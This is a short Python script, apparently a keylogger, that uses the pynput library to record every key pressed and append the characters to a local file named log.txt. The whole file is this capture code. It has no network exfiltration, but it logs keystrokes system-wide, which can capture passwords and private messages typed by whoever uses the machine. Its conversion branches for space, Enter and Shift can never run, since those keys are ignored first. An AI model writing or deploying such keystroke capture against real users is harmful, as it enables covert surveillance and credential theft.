from pynput.keyboard import Listener, Key, Controller

keyboard = Controller()
logged_text = ""

def write_to_file(key):
    global logged_text

    letter = str(key)
    letter = letter.replace("'", "")

    ignore_keys = [
        'Key.space',
        'Key.shift_r',
        'Key.ctrl_l',
        'Key.enter',
        'Key.up',
        'Key.down',
        'Key.backspace'
    ]

    # Check if the pressed key is in the list of keys to ignore
    if letter in ignore_keys:
        if key == Key.backspace and logged_text:
            logged_text = logged_text[:-1]  # Remove the last character when Backspace is pressed
        return  # Ignore the key

    if letter == "Key.space":
        letter = "."
    elif letter == "Key.shift_r":
        keyboard.press(Key.shift)
        return  # Don't log the shift key itself
    elif letter == "Key.ctrl_l":
        letter = ""
    elif letter == "Key.enter":
        letter = "\n"

    logged_text += letter  # Add the character to the logged text

    with open("log.txt", 'a') as f:
        f.write(letter)

    if key == Key.shift:
        keyboard.release(Key.shift)

# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()
